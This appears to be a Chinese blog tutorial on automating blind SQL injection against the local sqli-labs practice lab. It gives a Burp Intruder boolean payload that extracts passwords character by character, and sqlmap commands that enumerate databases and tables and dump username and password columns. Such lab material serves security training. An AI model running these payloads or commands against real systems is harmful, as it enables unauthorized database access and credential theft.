# 原创
：  【工具跑SQL盲注】

# 【工具跑SQL盲注】

**目录**

[一、（工具）burp跑盲注](#%E4%B8%80%E3%80%81%EF%BC%88%E5%B7%A5%E5%85%B7%EF%BC%89burp%E8%B7%91%E7%9B%B2%E6%B3%A8)

[1.1、方法一：爆破](#1.1%E3%80%81%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E7%88%86%E7%A0%B4)

[1.2、方法二：注入语句爆破](#1.2%E3%80%81%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%88%86%E7%A0%B4)

[二、（工具）sqlmap跑布尔盲注](#%E4%BA%8C%E3%80%81%EF%BC%88%E5%B7%A5%E5%85%B7%EF%BC%89sqlmap%E8%B7%91%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)

[2.1、命令：](#2.1%E3%80%81%E5%91%BD%E4%BB%A4%EF%BC%9A)

[2.2、利用过程：](#2.2%E3%80%81%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%9A)

[第一步：检测是否存在注入](#%C2%A0%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5)

[ 第二步：爆数据库名](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D)

[ 第三步：爆数据库表名](#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D)

[ 第四步：爆字段名](#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5%E5%90%8D)

[ 第五步：爆数据](#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

[ 三、推荐](#%C2%A0%E4%B8%89%E3%80%81%E6%8E%A8%E8%8D%90)

---


## 一、（工具）burp跑盲注

> 
<h3>1.1、方法一：爆破</h3>

抓包之后，将请求发送到"Intruder"模块


设置2个有效载荷
 <img alt="" height="884" src="https://img-blog.csdnimg.cn/08bf9d7ab0ad4f33b2ba8533af3a93a1.png" width="1200"/>





> 
<h3>1.2、方法二：注入语句爆破</h3>
注入构造语句，进行迭代操作
(select case when '§0§' = lower(substring((select password from employees where empid=1),§1§,1)) then 1 else 0 end)


---


---


## 二、（工具）sqlmap跑布尔盲注

> 
<h3>2.1、命令：</h3>
-u 指定注入点
--dbs 跑库 名
--tables 跑表 名
--columns 跑字段 名
--dump 枚举数据
跑出对应的后，依次加上-D 指定库 -T 指定表 -C 指定字段


> 
<h3>2.2、利用过程：</h3>
<h4>第一步：检测是否存在注入</h4>
**基础操作**
python sqlmap.py http://localhost:8080/sqli-labs-master/Less-5/?id=1 --batch
--batch是使用默认设置





其实环境都扫出来了 
就可以再加上--dbms mysql了
<hr/>
<h4> 第二步：爆数据库名</h4>
**命令**
#获取全部数据库
sqlmap.py -u url --dbs --batch
---------
#获取当前数据库
sqlmap.py -u url --current-dbs --batch
<hr/>
**基础操作**
python sqlmap.py -u 'http://localhost:8080/sqli-labs-master/Less-5/?id=1' --dbs --batch


 <img alt="" height="785" src="https://img-blog.csdnimg.cn/2e3030bb25244021b70a95ddaa2475bd.png" width="1200"/>
<hr/>
<h4> 第三步：爆数据库表名</h4>
**命令**
python sqlmap.py -u url -D DB --tables --batch
<hr/>
**基础操作**
python sqlmap.py -u 'http://localhost:8080/sqli-labs-master/Less-5/?id=1' -D security --tables --batch


 <img alt="" height="785" src="https://img-blog.csdnimg.cn/ff3c388116ad4d6384745b1e3c115a82.png" width="1200"/>
<hr/>
<h4> 第四步：爆字段名</h4>
**命令：**
sqlmap.py -u url -D DB -T TBL --columns --batch
<hr/>
**基础操作**
python sqlmap.py -u 'http://localhost:8080/sqli-labs-master/Less-5/?id=1' -D security -T users --columns --batch



<hr/>
<h4> 第五步：爆数据</h4>
**命令：**
sqlmap.py -u url -D DB -T TBL -C "COL1,COL2" --dump --batch
<hr/>
**基础操作：**
python sqlmap.py -u 'http://localhost:8080/sqli-labs-master/Less-5/?id=1' -D security -T users -C "username,password" --dump --batch


 <img alt="" height="785" src="https://img-blog.csdnimg.cn/b1239d1582e4458e90a904a8a09b53dc.png" width="1200"/>


#### 第一步：检测是否存在注入

---


####  第三步：爆数据库表名

---


---


####  第五步：爆数据

---


---


---


> 
<h2> 三、推荐</h2>
[【SQL注入-无回显】布尔盲注：原理、函数、利用过程](https://blog.csdn.net/qq_53079406/article/details/125275974?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165667562816782425129884%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165667562816782425129884&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-6-125275974-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4450)
[【SQL注入-有回显】DNS请求注入：原理、平台、使用过程、配置](https://blog.csdn.net/qq_53079406/article/details/125285625?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165667562816782425129884%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165667562816782425129884&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-7-125285625-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4450)


